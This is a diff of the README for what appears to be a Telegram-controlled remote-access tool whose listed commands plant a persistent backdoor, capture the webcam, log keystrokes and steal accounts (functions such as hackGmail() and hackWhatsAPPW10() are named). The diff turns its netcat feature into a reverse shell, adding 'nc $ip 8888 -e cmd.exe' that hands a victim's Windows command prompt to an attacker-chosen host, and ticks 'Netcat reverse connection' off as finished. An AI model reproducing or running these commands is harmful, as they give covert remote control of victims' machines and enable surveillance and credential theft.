@@ -84,7 +84,7 @@ ENTER
 - /backdoor ```IP``` (Create a persistent backdoor)
 - /webcam ```IP```
 - /keylogger ```IP``` ```time in seconds```
-- <img src="http://icons-for-free.com/free-icons/png/512/298878.png" width="24px" height="24px" /> /nc ```IP``` (Download netcat and execute ```nc -lp 8888 -v -e cmd.exe``` use ```nc <IP> 8888``` to connect)
+- <img src="http://icons-for-free.com/free-icons/png/512/298878.png" width="24px" height="24px" /> /nc ```IP``` ```IP to connect ($ip)``` (Download netcat and execute ```nc $ip 8888 -e cmd.exe``` use ```nc -lp 8888 -v``` to create a listener)
 - <img src="http://icons-for-free.com/free-icons/png/512/298878.png" width="24px" height="24px" /> /stopnc ```IP``` (Stop nc.exe and erase all archives) 
 
 #### Ultra :squirrel: 
@@ -114,4 +114,4 @@ ENTER
 - Add windows version detector in HackTwitterW10() and hackWhatsAPPW10() functions.
 - Add hackGmail().
 - :heavy_check_mark: Verbose via telegram messages.
-- Netcat reverse connection.
+- :heavy_check_mark: Netcat reverse connection.
